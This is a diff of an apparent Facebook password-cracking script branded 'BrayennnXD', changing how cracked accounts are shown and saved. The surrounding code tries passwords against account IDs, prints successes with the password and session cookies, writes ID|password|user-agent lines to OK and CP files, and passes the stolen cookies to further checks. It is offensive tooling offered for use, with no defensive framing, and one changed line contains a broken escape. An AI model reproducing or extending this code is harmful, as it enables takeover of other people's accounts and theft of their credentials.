@@ -2182,7 +2182,7 @@ def reguler2(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2541,7 +2541,7 @@ def colmek1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2582,7 +2582,7 @@ def colmek2(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -2591,7 +2591,7 @@ def colmek2(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -2604,7 +2604,7 @@ def colmek2(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(cektahun+'|'+idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -2614,7 +2614,7 @@ def colmek2(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(cektahun+'|'idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
